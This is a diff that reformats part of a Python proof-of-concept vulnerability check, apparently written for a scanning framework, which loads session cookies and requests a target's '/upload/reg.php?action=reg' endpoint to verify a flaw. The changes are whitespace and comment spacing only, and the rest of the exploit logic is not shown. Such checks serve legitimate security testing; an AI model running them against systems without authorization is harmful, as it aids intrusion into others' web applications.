@@ -47,22 +47,23 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path' ).lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #首先登录用户。获取cookies
+            # 首先登录用户。获取cookies
             s = requests.session()
             cookies = {}
             raw_cookies = self.get_option('cookies')
-            for line in raw_cookies.split(';'):  
-                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
-                cookies[key]=value
+            for line in raw_cookies.split(';'):
+                key, value = line.split('=', 1)  # 1代表只分一次，得到两个数据
+                cookies[key] = value
 
-            #验证漏洞
+            # 验证漏洞
             payload = '/upload/reg.php?action=reg'
             url = self.target + payload
             s.get(url, cookies=cookies)
